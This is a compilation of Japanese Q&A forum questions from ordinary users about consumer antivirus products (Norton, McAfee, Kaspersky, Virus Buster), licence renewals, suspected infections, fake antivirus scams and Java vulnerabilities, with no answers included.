Windows7に切り替えたので、XPの時にタスクバーをコンパクトにできるので重宝していたImeTrayを入れようと思い、念の為、ファイルにウィルス等埋め込まれていないか、http://virusscan.jotti.org　でチェックしたところ、Troj.Dropper.W32.Agent.amm とPUA.Win32.Packer.Cryptolock-3 が検出されました。これらはマルウェア（前者はトロイの木馬？)のようなのですが、日本語のサイトではあまりヒットしません。 定評あるソフトなので大丈夫だと思いたいのですが、2つのチェックソフトでひっかかったのでインストールしたものか迷っています。ImeTray最新版(ImeTray042)を入れて問題ないでしょうか。
FMV BIBLO NF４０W を使用しています。 「maicrosoft security essentials をインストールしました」 ハードデスクの空きがぎりぎりです。 opswat utilities ; opswat toolbar がインストールされているのを、削除しても問題ないでしょうか。 toolbarだけでも削除したいのですが。
8にアップグレードして使ってましたが意図しないタイミングで突然再起動を何回も経験し7に戻そうと考えています。が気になるのはすでに3台に入れて3台ともアクティベーションの済んでる3台バージョンのカスペルスキーです。 7に戻すと別PCとしてカウントされそうな気がするのですが実際試されたり経験ある方に質問です。 別PCと判定されてアクティベーション不可能になりますか？そもそもライセンス的に問題はありますか？
トレンドツールバー有効にしてますか？ 特にメリットを感じないので無効にしようと思っているのですが有効にしておいた方が得策でしょうか？
ソースネクスト製のウィルスセキュリティーＺＥＲＯは、Windows 7 Starter 32bitに、対応でしょうか？ 購入を検討中です。メーカーのＨＰには、動作環境の詳細は記載されてません。 Windows 7 Starter 32 bit　で、動作確認済みの方は、いらっしゃいますか？ アドバイス下さい。 動作環境対応OS： Windows® 8（32ビット/64ビット版） Windows® 7（32ビット/64ビット版） Windows Vista®（32ビット/64ビット版） Windows® XP Windows Server 2008 Foundation ※Windows XP以外は、64bitOSにも対応 ※Windows XPはSP2以上が必須です インストール容量：約200MB 推奨メモリ容量： Windows 8 / 7 / Vista 1GB以上 Windows XP 512MB以上 最新のサービスパック、セキュリティ修正プログラムをすべて適用済みであること インターネットが使えること メールアドレスが必要 必要メモリ容量などが書かれていない場合はこちらをご参照ください詳細 ご注意 同種のセキュリティ対策ソフトとの併用はできません。 ウイルスセキュリティ体験版をインストールすると、現在お使いのセキュリティソフトは自動でアンインストールされます。 以下の環境ではお使いになれません。 RAID Windows Server 2008 Foundation以外のサーバー機（IIS、Apacheなどのサーバー化ソフトも含む） VPN 回線
JREやAdobeのFlashPlayer、AdobeReaderなどは、自動アップデート機能がバックグラウンドで動いており、アップデートがあれば自動でウィンドウが立ち上がり、アップデートをユーザーに促してきます。 この際、UACがアップデートの許可を求めてきますが、もし仮に全然別のウィルスがそれらアップデートの画面と全く同じものを表示してきてユーザーに許可を促す、ということはありうるのでしょうか？ ありうる場合、「ウィルスの騙りではなく正真正銘Javaのアップデートである」判断する方法はあるのでしょうか？ 今まで「Javaのアップデートなら」とそのままOKしていましたが、詐称されていたらどうなるんだろう、と恐くなりました。 アップデートの有無の判断だけやらせて、更新自体は手動でWebサイトからやれば安全そうですが、できれば 自動アップデートの告知⇒その画面からアップデートを開始する という流れはそのままにしたいのですが。
最も安全性の高いソフトという宣伝文句でこれに決めたのですがスパム以外反応がありません。 これは感染してないと考えるべきなのでしょうか？ ノーガードPCは数十分で感染するという話がありますが、あの理屈だとウイルス自体は感染しなくとも入ってきてるはずで、それはログに残るはずです。なので不思議です。 2台のPC両方とも同じです。ウイルスを遮断した記録がありません。 質問です。 皆さんはここ3年間で何件のウイルスのログがありますか？ 何件ぐらいウイルスがやってくるのが普通なのか教えてください。
教えてください。 ノートンマルチデバイスセキュリティという、 windows以外にもMacやアンドロイドに対応したものがありますが、 その説明を見ていると、Mac版はfirefoxのブラウザが対応と書いて あるように見受けられますが、firefoxを入れたくない場合は この製品は意味がないのでしょうか。 教えてください、よろしくお願いします。
マカフィー、ノートンと有料のウイルス対策ソフトがありますが、 クレジットカードで登録しておくと１年毎に自動延長してくれる「自動延長サービス」というのがあります こういったセキュリティソフトは、毎年２０１１・２０１２・２０１３とその年の製品が発売されますが、 この自動延長では、次の年の製品と同じ物に勝手に切り替わってくれるのでしょうか？ 例えば２００９年に買ったマカフィー(ノートン)を自動延長サービスに登録しておき、 ２０１３年時点で使っているマカフィー(ノートン)は、”２０１３年”(２０１３年に発売した２０１３年版)の製品と全く同じなのでしょうか？ それとも仕様は２００９年版のままなんですかね？ (その場合、自動延長サービスに登録しておいても最新版にはならないという事でしょうか？) 又、この自動延長サービスは、日頃の更新とどう違うのでしょうか？ ただ単に支払いが自動ですよって事だけでしょうか 日頃から更新がなければ最新のウイルスに対応が出来ないため、日常でも更新されますが、 製品名(年)が変わったりすると製品そのものが変わってるんですかね？ 宜しくお願い致します。
PCを３台所有しています。 今まで、マカフィー(PC３台まで対応)を使っており、自動延長にも登録してずっと使い続けていました。(もちろん全PCマカフィー) そのうちの１台のPCが壊れたため購入し直したのですが、現在はそちらにはノートン(体験期間)が入っています。 新PCだからかもしれませんが、ノートンの方が軽くて使いやすく、 逆にマカフィーは”重たい””トラブルが多い”といった悩みが多かったので、この機会にノートンに切り替えようかと思っています。 その際の質問です。 (1)現在PCを３台所有しており、１台が新しく買ったばかりのノートン体験期間中、２台がマカフィー正規契約中となっています。 さすがにマカフィ＆ノートンとはいきませんので、(2)で述べるようにノートンインターネットセキュリティに完全移行を検討しているので すが、ノートンにも３台まで対応の物があるのでしょうか？ また、この行為にアドバイスや注意点等あればお願いします (2)完全移行するならば、マカフィーを解約→全てのPCでマカフィーをアンインストール→ノートンインターネットセキュリティ契約→全 PCに ノートンをインストール で間違いないでしょうか？ 間違い、注意点あればご指摘願います。 以上、これら上記の事を見ていただいた中で、注意点やアドバイス等あればご指摘下さい 宜しくお願い致します
僕のパソコンのデスクトップ画面に無名のフォルダがかってに作成されました　 どうすればいいですか　マルウェアですか　 画像貼っておきます　解決方法を教えて下さい
お世話になります。 スマホで壁紙を探そうと、ネットサーフィンをしていました。 そこで下記サイトにたどり着き、閲覧していたところ画像をタッチしてリンクを開くと そのまま画像が大きくなるものもあれば、海外のサイトに繋がってしまう画像もありました。 ttp://matome.naver.jp/odai/2133583394265151801 パソコンで同じように閲覧したところ（パソコンにはウイルスバスターを入れています） 危険性のあるサイトと表示されました。（中には表示されないサイトもありましたが） NAVERはよく利用しているサイトなだけに信頼していますが心配です。 スマホでもサイトを開いただけでウイルスに感染することってあるのしょか？
この間から、このカテで何回か質問させてもらってます。　お世話になります。 先日自分でBBセキュリティpowered by symantec　をスタートメニューから標準的にアンインストールしてしまい、そのご購入したノートンインターネットセキュリティをインストールしました。 案の定、パソコンが不安定になり自分ではどうしたらよいか分からずにノートンのチャットサポートに連絡しました。 そしたら中国人の女の人？が対応してくれて、もしよければ遠隔操作で直したいというような事を言ってきたのでお願いしました。 すごく丁寧な方で、すぐに取り残しがあるような前のファイルを削除してくれてそのあとすぐにインストールし直してくれアクティブ化もしてくれました。 遠隔操作なんて今まで見たこともなくて、最初は不安だったけどとにかくその人の仕事のスピードにただただ驚くばかりでした。 それで、ここまではよかったのですが、チャットを切った後もう一度夜にネットをしていたらセーフウェブが出ていない事に気付き、自分で確認したらその機能はONになっていました。 理由が分からず、セーフウェブが出ないと不安なのでもう一度チャットサポートに連絡しました。 そしたらまた違う中国人女性が出て、またよければ遠隔操作で直す事もできますが？と言ってきたので承諾しました。 そしたら前回の人に比べて、対応もあまりよくなく前の人は何をしてるか私の目にも見えていたのであまり不安はなかったのですが、２回目の時は何をしているのかよくわからなくて、デスクトップは真っ暗になるし、チャットで何度呼びかけてもなかなか対応してくれず本当に不安な思いをしました。 一応、セーフウェブは表示されるようになったのですが、何か不安だけが残ってしまいました。 パソコンの事なんて全くわからないから、相手が何をしているのかわからなかったことと(１回目の人と比べてあまり操作している感じがなく、画面が止まったまま)、呼びかけても長時間放置されたことなどで、このまま私のパソコンどうなるの！？と本当に死ぬほど不安で怖かったです。 大げさに聞こえるかもしれませんが、寿命少し縮まったかもと思うくらい不安でした。 こんなこと言っていいか分かりませんが、今中国と日本の関係ってかなり悪いですよね。 そんな事ないとは思いますが、何かに悪用されたりしないでしょうか？　１回目に対応してくれた人の時はそんな事思いもしませんでしたが、２回目の人の対応に不安があったので何か心配になってきました。 ノートンのチャットサポートや電話サポートは外国人がでる事があるのは知っていましたが、ほとんど中国の方なのでしょうか？ あと対応してくれた方たちは、東京かどこかにいるのか、それとも中国からだったのか、すごく気になります。 日本人の電話のオペレーターなども感じのとてもいい人と、そうでない人がいますが、今回の事もただ単にそういうことだったのかもしれませんが、今回は私のパソコンを遠隔操作しているので少し神経質に考えてしまっています。 ノートンのチャットサポートで遠隔操作お願いしたかたいますか？　その後、何もおきませんでしたか？ もしこれを見られた中国の方、気を悪くしてしまったならすみません。 宜しくお願いします。
危険サイトの遮断率はIEが9割で他は数パーセントでIEが圧倒的でした。 firefoxやchromeがIEより安全で優れていたのは昔の話ですか？
gooやgmailやhotmailにログイン後、ログアウトせずにほかのサイトを訪問したらそのサイトの管理者にIDやパスワードや履歴はバレますか？ ログアウトしないと危険って話を昔見たような気がします。
ウイルスチェックのソフトを、パソコンを買い換えるときに一緒に買います。 色々なソフトが売られています（ノートンとかウイルスバスター等）が、どれが一番軽い（パソコンの動きが遅くならない）かどこを見たら分かりますか？ パソコンの動作に一番支障がでないソフトを買いたいです。 教えてください。 今のPCは９年立ちました。故障しました。それにはノートンが入っていて、パソコンの動きは相当遅かったです。
Mac OS Xのバージョン10.6.8を現在使用しています。 ノートンのウイルス対策を入れようと思ったのですが、購入したのがMac OS X10.7/10.8用みたいで、使えないみたいです。 OSのバージョンアップは出来ないのでしょうか？ 父がWindows使っているので、MacWindows両方使えるものとして買って来てくれたものです。 よろしくお願いいたします。
つい先ほど、BBセキュリティ　by symantec　をたぶん無事にアンインストールし、先日買っておいた黄い箱のノートンインターネットセキュリティをインストールしました。 そこで何かよく分からないのですが、前のbbセキュリティの時のノートンはデスクトップの右側に常に表示されていて開けなくても『安全』と書かれていました。 しかし、今インストールしたノートンはデスクトップに何も表示されません。 なのでタスクバーに表示するようにしてみたのですが、ノートンのマークはあっても『安全』とか緑のチェックが全くありません。 それをクリックすると緑の背景に白文字で『安全』と出るのでちゃんと働いているのだとは思いますが、普通は『安全』とか緑のチェックマークはタスクバーからでは確認できないのですか？ いちいちネットをする前に、ノートンを起動させて『安全』かどうか確認しないといけないのでしょうか？ 皆さんはデスクトップに表示していますか？　それともタスクバーにですか？ あとアクティブ化ですが、プロダクトキー入力と言うところをクリックして、プロダクトキーを入力したらアクティブ化されましたみたいなメッセージが出たのですが、これで大丈夫ですか？ ノートンのアンインストールは難しいみたいに聞いていたのですが、私の場合簡単にできてしまったので心配になり、アンインストール後にすべてのプログラムで確認したところ前のBBセキュリティのノートンはありませんでした。 これはちゃんとアンインストールできているのでしょうか？ もしちゃんとできていなくて後で、不都合が起きると大変困るので不安です。 宜しくおねがいします。
ノートンいじってたらダウンロード版買ったかもしれない　ほしくないのに 残り1075日の後に延長と書いてあり プロダクトキーが書かれたメモが添付されました　これはどこからか請求が来るのでしょうか ノートンから送られてくるメールは文字パケしていますこれでパスワードがわからず この事態になりました 一度アンインストールして入れなおしたが　延長の文字消えず 延長の文字を消す方法を教えてください（質問１） ノートンからプロダクトキー（製品のインストールファイルの中に ）が送られてきた　使わないとどうなる（質問２） お金を払わなくていい方法はありますか？（質問３）
９年間ヤフーの月６００円くらいのノートンセキュリティに入っていたのですが、今月の末でヤフーを解約する事になりそのセキュリティも解約と言う事になりました。 なので、新しくノートンのセキュリティソフトを買ってきたのでインストールしようと思ったのですが、今すでに入っているノートンをアンインストールしないといけませんよね？ 今まで何かをアンインストールした事がたぶんないので、違う何か大事なものまでアンインストールしないかとても心配です。 今アンインストールするための画面を開いてみたら、ノートン関係のは『norton internet security』　と　『norton online backup』というのが２つありました。 他にノートンと書かれたものは見当たらなかったのですが、この２つをアンインストールして大丈夫でしょうか？ これをアンインストールした後に、買ってきたソフトを入れて説明に従ってインストールでよいですか？ windows7 です。 宜しくお願いします
Win32:MiniMal [Trj]というやつはPCに対して無害なのでしょうか？ 色んなところで大丈夫とか削除したほうがいいなどと意見があります。 本当のところどうなのでしょうか？ 詳しい方、知ってる方がいたら教えてください。
ネットを閲覧していたら、いつの間にかにデスクトップの壁紙がネットからコピーして保存していた（しようとした？）画像に変わっていました。こんなことってあるのでしょうか？
ｗｉｎ7にAdministrator（管理者権限）で問題なくインストールできました。しかし、ユーザーを切り替えたところ、ウイルスバスターのメイン画面に「データーを守る」と「家族を守る」がありません。Administrator（管理者権限）ではこのようなことはありません。アドバイスお願いします。
adovanced system protectorというウィルス駆除ソフトをダウンロードし個人情報も入力してしまいました。よく考えれば怪しいとわかるのですが感染表示にあわててしまい。うかつにも購入してしまいました。不徳の致すところです。後でそのソフトを検索したところ詐欺まがいのソフトと分かりました。怪しいソフトらしいのでパソコンのデーターが流失したのではないか、個人情報が不正に使用されないかと心配です。30日以内なら解約できるとの表示もありましたが，明記してあるサポートセンターにメールしてよいものかどうかも心配です。 今後どのように対処すればよいのかご教授ください。よろしくお願いいたします。
Mac使用者です。 LiveUpdateが毎日稼働しますが、見ていると、毎日NAV for Macintosh Virus Defsというのが更新対象になっています。 毎日更新が必要なほど、毎日不備が見つかっているということですか？ コンピュータの素人なので、おかしな質問でしたらすみません。
・お薦めのセキュリティソフトをご紹介ください。ノートンはアフターケアをふくめ今一だときいていますがいかがなものでしゅか。 よろしくお願いします。
windows7,IE9です。すべてアップデートは最新です。 以下時系列でやったことを書きます。 さきほど２ちゃんねるに書き込まれたリンクをうっかり踏んだら、血まみれの女性の画像でした。 ↓ そのURLをノートンのセーフウェブ（http://safeweb.norton.com/）でチェックしたら、判定は黄色で、１つマルウェアと思われるものが表示されました。たしかupload.asiaとかいう表示名だったと記憶。 ↓ その後ＰＣをセーフモードでMSNフルスキャンしたところ何もありませんでした。オンラインスキャンも結果はシロでした。 そこで質問です。 これはガードしてくれた、すなわち私のＰＣにはマルウェアがインストールされていないと解釈してよろしいでしょうか。 久しぶりの出来事なので、不安です。よろしくお願いします。
パソコンを立ち上げると「ＷＡＲＮＩＮＧ」という画面が出て×で消えるのですが インターネットにつなごうとするとつながらずまた出ます。 動画とか音楽をダウンロードしたりしてないのですが 昨日調べることがありいろいろなサイトを見たりはしました。 ウイルスでしょうか？どうすれば消すことができますか？ 教えてください。 ドキュメントとかすべてのプログラムを見ましたが変なものはないので どこにはいりこんだのでしょうか？
ノートンかカスペルスキー2012or2013で迷ってます。 http://www.the-hikaku.com/security/08hikaku1.html こちらの比較サイトを見るとマルウェアの面ではカスペルスキーが上のようです。 しかしファイアーウォールの性能はどうなのでしょうか？ ノートンの長所短所 カスペルスキーの長所短所 を教えてください。 ノートンを使用していたときは問題ないファイルでも勝手に消されたりすることがありちょっと嫌でした。
生まれて初めてパソコンを買って３ヶ月位経ちます。 インターネットセキュリティソフトがパソコンを買って３ヶ月間はお試し期間としてついていました。 昨年末、セキュリティソフトを自動延長する手続きをネット上でしました。 具体的には名前、メールアドレス、料金支払いの為のクレジットカードの登録などです。 その際、『お試し期間が切れる前に自動的に申し込んだソフトに延長される』と言った旨の画面が出てきたと記憶しています。 なのに、先ほど再び申し込みの画面が出てきました。 セキュリティソフトの会社に電話にて問い合わせすればよいのでしょうが、もう電話受付の時間は終了しており、間の悪いことに早急にインターネットに接続したい用事があります。 この質問は携帯電話から投稿しています。 電話受付が始まる明日の朝まで待つしかないのでしょうか？ よろしくお願いします。
目的のフリーソフトのリンクと勘違いして、下記のリンクから、過って違うソフトをダウンロードしてインストールしてしまいました。 http://dfb.mediaconvertdownload.com/download/vid … 一応インストールする前にセットアップファイルをEset Smart Securityで検査をしましたが問題はありませんでした。 しかし、インストール完了直後にGoogle Chromeが自動でWebページ開こうとして、Esetが警告メッセージを表示しました。 ウィルスに感染していないか、凄く不安なのでインストールしたソフトを削除したいのですが、見当たりません。 どうしたら削除できるでしょうか？アドバイス宜しくお願いします。
一太郎ビューアをダウンロードしようと次を選びました。 http://ichitaro-viewer.apportal.jp/ すると、危険なサイトであるので、とりあえずはこれ以上進めないとのコメントが表示されます。 これは私のウィルスソフトが心配症なのか、本当に危ないのか判断できません。 ここにアクセスしダウンロードされた方、問題なかったことを教えてもらえませんか？
OSはWindows７ですメールはWindowsliveメールを使っています。 時々なんですが件名がReturned Mail:&gt;&gt;User unknown差出人がinfo@qwsajsu.com 本文に　<受信者の 1 人がサーバーによって拒否されたため、メッセージを送信できませんでした。> と書かれています。自分では送信していないのにこれはただの迷惑メールなのかパソコンがウイルスに感染しているのでしょうか。？ウイルス対策ソフトはフレッツウイルスクリアを導入しているんですが。
家族とパソコンを共有しているものです。 そのため自分の見られたくないデータはCドライブの分かりにくい場所に隠しているのですが、カスペルスキーがウイルスを発見した時、どのフォルダ・ファイルから検出されたかも表示してしまい、隠し場所や隠しているファイルのことが知られてしまいます。何か良い対策はないでしょうか？
すでにＪＡＶＡソフトは完全に安全で無いと言われて久しいが、待っていても一向に対策済みＪＡＶＡ ソフトがメーカーから交付されませんが、何時になったら入手出来るのでしょうか？ 毎日使うWEBソフトで当ソフトを活用したWEBが使えなく困っています。 今はｊａｖａをＰＣ上で無効にしていますが、使いづらく、でもいつまで待ってもこれで良いという ソフトが出てきません。 同じ問題で困っている方も居られると思いますがどのように解決されておられるのでしょうか？
もう少しでウィルスソフトの更新時期です。 今まで何も考えずソフトを選んでいましたが、昨今の韓国や中国によるメディア侵略や明らかな領土への挑戦などで、日本の危機に遅ればせながらようやく気付きました。 そこで、今後は少なくても私の個人的お金は韓国や中国へ流れるようなことがないようにしたいと思い立ちました。 ですので、多少高くても（安いほうがもちろん嬉しいですけど・・・。）日本の国益につながるソフトを導入したいと考えていますので、ぜひそういった視点でのおすすめソフトを教えてください。 回答宜しくお願い致します。
niftyの会員です。 たまにnifty無料ウイルスチェックを http://www.nifty.com/security/vcheck/ から行いますが急にできなくなりました。 なぜなんでしょうか？ 2013/1/30
PCに変なアイコンらしきものが、点滅してます。 お絵かきソフトで、書いたので、分かりにくいかもしれないですが、分かる方、教えてください。 四角の中は、黄色で、点滅してます。中の、黒く塗ったところは、青で、残りが、黄色です。 触りたくなかったものですから（ウィルスですかねえ）、こんな投稿になりました。 よろしくお願いいたします。
PCは長く使っていますが、技術的なことは素人同然です。 現在Internet securityを使用していますが、更新時期がせまっています。 メインマシン：XP サブマシン（旅行用/Acer）：XP 同居人：Vista の３台に入れています。 近々メインマシンをWindows8に買い替え予定です。 ノートンは、気に入っているのですが、Vistaを使っている同居人は重いというのです。 わたしも、そんな気がしないではありません。 でも、シマンテックのサポートには、かなり満足しています。 ウィルスバスターの場合、ファイアウォールはXPでは効かないという話を聞きました。 そうすると、旅行用のXPは丸裸になってしまうのでしょうか？ Windows8, Vista, XP の３つに有効なのは、Internet securityでしょうか？ 価格の点では、ウィルスバスターに軍配が上がり、迷っています。 至急回答お願い致します。
NTT西日本セキュリティ対策ツールでアップデートをしようとすると、アップデートを確認するにはネットワーク接続が必要です。という風にでてきます。 ネットで調べたりしてみたのですがどうもうまくいきません。よろしくおねがいいたします。 ちなみに今のversionは５です。 パソコンはwindows7 LaVieを使っています。 利用しているサービスは、フレッツ光ネクスト　ファミリー・スーパーハイスピードタイプ隼です。 よろしくおねがいします。
以前からカスペルスキー　Internet Security2012を使用しているのですが、つい1週間ほど前からアップデートが出来なくなってしまいました。アップデートを開始すると、数十パーセントまで進んだところで、毎回「ファイル操作エラー」と表示され、アップデートが強制中断されてしまいます。検索してみても、同じような症状の方が見つけられず、困っています。解決方法を教えてください。 （詳細レポートに以下のように表示されました） ファイル操作エラー　　 http://dnl-06.geo.kaspersky.com/bases/av/kdb/i38 … タスクを処理できません　　　
最近パソコンを買いました。 一番最初についていたウイルスバスター!?の期限が切れて今日6日目なんですが、やはり危ない状態ですよね!? そこで新しく購入しようと思うのですがどこで何を買ったらいいのか分からないのです。 おすすめを教えていただけませんか!?
先ほどモンスターハンターフロンティアをインストールしようと思い、 PCにインストールディスクを挿入し、マイコンピューターのCDドライブをクリックしました。 そうしたら、私のPCに入っているAvastアンチウィルスが反応し、ウィルスを検出した というような警告が表示されました。OSはWindows7です。 それから何度かCDドライブをクリックしても、「ファイルにウィルスが含まれているため操作は正常に完了しませんでした。」と表示されて開くことができません。 ちなみに、このCDは以前に１度自分のPCで使用しただけで、他人のPCに入れたことはありません。 当方ウィルスに関しての知識は全く無く、 ウェブで詳しく調べたところ、感染していたのはAUTORUN.EXEという名前のウィルスのようです。どうやらUSBメモリなどを介して感染する物のようです。 この場合どうすべきでしょうか？ このままCDが使えないというのも不便です。セキュリティソフトの誤検出と言うことは考えられますか？ 詳しい方教えて下さい。
学校でＰＴＡをやっています。 ＰＴＡ室のパソコンですが、ネットに接続していません。（所有はＰＴＡです） 各委員がそれぞれＵＳＢでデータ管理をし、学校のパソコンにつないで印刷等行っいます。 いわば、不特定多数のＵＳＢを使用する感じです。 それぞれの委員のご家庭ではウィルス対策も違うと思いますので、学校のパソコンにも何か対策をした方が良いのでは…と思っています。 素人なので詳しいことはわかりませんが、市販のＣＤ－Ｒみたいなのがあるのでしょうか？
Comodo internet securityの使用者です。 無料ゲームなどをダウンロードしてインストールしようとするのですが、コモドが自動で作動し、ファイルを隔離してしまいます。 なので画面右下のアイコンを右クリックしてコモドを終了したあと、再度ゲームをダウンロードしたのですが、また自動で隔離されてしまいます。 タスクマネージャーで強制終了しようとしても、いくつか終了できないものがあり、コモドを切ることができません。 どうしたら一時的にコモドを完全に切ることができるでしょうか？ アンインストール以外の方法があればお教えください。
ウイルスを検出したのですが隔離も削除もできず困ってます 検出されたウイルスはC:\Windows.old\Documents and Settings\ALL Users\Application Date\Application Date\Application Date\Application Date\Application Date\Application Date\Application Date\Application Date\Application Date\k7 computeing\k7TSecurity\k7AntiVirus\Quarantine\ 9641AA15922B65651A934A6549F68CBk7v です どうすればいいか詳しく教えてください
こんばんは。 初めてmacがウイルスに感染したかもしれません。 ーーーーーーーーーーーーーーーーーーーーーー 機種　iMac OS Mac OS X バージョン 10.7.5(lion） セキュリティソフト　Sophos Anti-Virus（無料） 感染ウイルス　Mal/GIFIframe-A ウイルスと思われるファイル名　f_00436d ーーーーーーーーーーーーーーーーーーーーーー いつもの様にネットをしていたら、突然 「ウイルスを隔離しました」 と表示され、Sophosが起動し、隔離マネージャが開きました。 発見されたのは以下のウイルスです。 http://www.sophos.com/ja-jp/threat-center/threat … 感染対象OSがWindowsということですが、気になって今全ファイルを検索中です。 Sophosによると、このファイルは手動削除しか方法が無い、と警告しています。 一生懸命iMac内で検索を掛けて探したのですが、ファイルが見つかりません。 また外部検索（Google）も検索を掛けて対応策を探しましたが、見つかりません。 どうしたら良いでしょうか？ Mac・Windows関係なく、このウイルスに感染した方、駆除した方に 対応方法を教えてください。 このウイルスによりどんな影響、動作をするのかも出来ましたら教えてください。 よろしくお願いします。
セキュリティーソフトを開いてレポートを見ると　Web脅威　が4件ありますが、この処置はどうすればいいのでしょうか。
ウイルスバスターを今まで使っていたのですが有効期限が過ぎてしまい、 無料のaviraをインストールしました。 McAfee Security Scan Plusでチェックして問題がなかったら ウイルス対策は大丈夫ですか？
Amazonで、ちょうど欲しかったPCゲームソフトを中古で売っていて、中古ということもあって、手頃な値段で、買おうと思ったのですが、この場合その中古のソフトにウイルスなどが、入っている可能性は、あるのでしょうか？？ あまりPCに詳しくないです。 回答お願いしますm(_ _)m
東芝win8ノートＰＣを使ってきましたがヤフオクで売ろうと思ってます google chormでmixi、アメブロ、フェイスブック、株式などＩＤとパスワードを保存しています。 リカバリすれば消えるでしょうが落札者に復元などされてのっとられないか不安です。 その辺りはどうなのでしょうか？安心して売って大丈夫でしょうか。
PCのセキュリティーソフト（NortonInternet Security)を購入しダウンロード成功したのですが　PCの内部でエラーがあるのかスタートしません。古いソフトはアンインストールしてから　新しいのをインストールしたのですが　どうしたらいいのでしょうか　教えてください　米国のオンラインで購入してます。＄４９したので　無駄にしたくありません。 購入前他のメーカーの（Mcafee)無料ダウンロードをしようとしましたが　不成功ではじかれてしまいました。
ノートンインターネットセキュリティー体験版を インストールしてみたのですが前に使っていた頃と比べ あれ?と思う点があるのです。 ※数年前、一年間使ってました。 メール送受信の際ソフト画面の下に表示になるノートンの マークが出てなかったり他にいろいろ。 もしかして体験版は一部の機能しか使えない制限付きということなのでしょうか?
いささか怪しいサイトを開いてしまったところ、突如、英語の画面にて著作権違反により金銭を請求する内容の画面が出ました。いろいろな削除方法を試したいのですが、そもそも画面すべてが請求画面で、タスクバーも表れず、ctl＋Alt＋Deleteで再起動はできるものの、タスクマネージャーは起動できません。タスクマネージャーの起動をクリックするとその請求画面に飛びます。また、再起動後の最初の画面は、ビデオソースという画面でビデオデバイスを選択させるようなものが出ます。いずれを選んでも請求画面に飛びます。F8によるセーフモードでの起動もできません。したがって、PCの操作が一切できないので、この質問も別のPCで作成しています。新種の強力なウィルスでしょうか？是非、解決方法をご教示ください。PCさえ操作できるようになれば、撃退できると思うのですが、よろしくお願いします。
こんにちわ この間ファイアウォールソフト（Windows Firewall Notifierを使ってます）のポップアップで C:\ProgramData\Macrovision\FLEXnet Connect\6\agent.exeが外部に接続するのを 許可しますか？と聞いてきたので、なんだろうと辿っていってみたら6以外に11（これにも agent.exe有)とDatabaseと言うのもありました。 これはどう言うソフトなんでしょうか？スパイウェア？ウィルス？ これをインストールした覚えもないのに。。。 ほっとおいた方がいいですか？それとも消した方がいいですか？ 一回消そうとしてみたんですがアンインストールできない仕組みなのか怖くって出来ませんでした。 解決方法を教えてください。そのまま接続させてもいいでしょうか？ それとWindows Firewall Notifierで一回ブロックしたのを許可し直す方法を知ってる方はそれも 教えてください。 お願いします。
Windows8のDefenderはウイルスチェックができるようになりましたが、Vistaや7のDefenderをウイルスチェックできるようにはできないのでしょうか？
最近とあるソフトの体験版をダウンロードしたら昔はユーザーに通信許可を一つ一つ丁寧に訪ねていたはずなのが今のバージョンはセキュリティソフトが安全認定したものは自動許可してるようで勝手に通信されてました。昔ほど手動設定も簡単ではないようです。 全部通信許可を聞いてきて利用者側でそれを制御できる強固なファイアウォールソフトはいまだと何が該当するのでしょうか。有料でも無料でもいいのでおすすめのファイアウォールを教えてください。
JAVAの脆弱性が問題になっており、無効にすることを薦める記事が多いのですが、IEでＪＡＶＡを無効にする手順を教えて下さい。
つい最近まで通常に起動していたスーパーセキュリティZEROですが PCが重いので今さっき開いたところ 「スーパーセキュリティのライセンスキーは期限切れです」 「Buy nou」「今すぐ登録」 そこで今すぐ登録と押すと下のように、ライセンスキーで製品を登録するようにでてきました。 (ライセンスキーは伏せてあります) 最近までは普通に使えていたはずなんですが 突然でなにがなんだか分からず困惑しています。 これはもう一度買い直すしかないのでしょうか…… このままではウイルスがはいってきそうで心配です。 機械には弱くどのような対処をとっていいのか分かりません。よろしくお願いします。 オペレーションシステム　：　Windows 7 Home Premium 64 ビット システム製造元　：　TOSHIBA BIOS　：　InsydeH2O Version 03.06.452.80 プロセッサ　：　Intel(R) Core(TM) i3-2330M CPU @ 2.20GHz (4CPUs). ~2.2GHz システムモデル　：　dynabook T451/35DW メモリ　：　8192MB RAM ページファイル　：　2884MB 使用中　13393MB 使用可能
ビビックのセキュリティーソフトをパソコンに入れています。 このソフトの内容は、マカフィーのサイトに載っている 製品一覧でいうとどのバージョンが同じ、もしくは近いですか？ 友達がマカフィーのどのバージョンを購入するか悩んでいて まったく何が必要なのかわからないので、同等のものを すすめたいと思っています。 わかる方いらっしゃいましたら教えてください。
ドコモのタブレット端末を購入しましたが、セキュリティーをどうするか迷ってます。ドコモのあんしんスキャンかノートンのアンドロイド版か？
お世話になります。 迷惑メールに仕込まれているウイルスって開くだけで感染するのですか？ よく海外からメールがくるのですが、たまにですが開いて読むこともあります。英語なので内容はわかりませんが、 URLとはクリックしません。 中に気になるメールがありまして、調べるとウイルスが仕組まれている可能性も・・とありました。 開いて読んでしまうだけで感染するのでしょうか？
パソコンのマックを買いました。 ウイルス対策はする必要がないと聞きましたが、ウイルスバスターとか入ったほうがいいですか？
windows8にはsmartscreenという機能があってそれがやばいアプリを自動ブロックするそうです。 これはアンチウイルス各社が最近やってるクラウド防御と同じですか？HIPSとは別の機能ですか？ セキュリティ的に強固だから7から8にアップグレートはアリ？8のセキュリティ機能には5000円の価値はありますか？
最近Javaのぜい弱性が問題になっていますが、Javaはどういうところに使われているのですか？ 新聞にはJavaを無効化するように出ていますが、無効化すると何か不都合なことが、ありますか？ 教えていただけます様、お願いいたします。
先日、パソコンの電源を切ってから丸一日「プログラム更新中」となり、電源が切れない状態になったので強制終了をかけました。 後日どうも動作が遅い気がして調べてみたら [f78d21880b1cb0db04ae82481f0c646d] というフォルダがあり、削除しようとしても 「このフォルダを削除するには管理者のアクセス許可を提供する必要があります」 というメッセージが出ます。 最近遠隔操作など、物騒なことを聞くので何とか削除したいのですが、どういう方法があるでしょうか。 ちなみに現在そのパソコンはネット回線からは切り離しています。 このしつんもんは別のパソコンからしています。
ウイルスバスターの国際ＯＥＭ版 １． ヤフオク　２０００円程度 http://page16.auctions.yahoo.co.jp/jp/auction/u4 … ２． 正規版 ８０００円程度 http://kakaku.com/item/K0000416042/?lid=ksearch_ … の違いはなんでしょうか？ 違いがさほど、ないなら 国際ＯＥＭ版でよいのでしょうか？ 宜しくお願い致します。
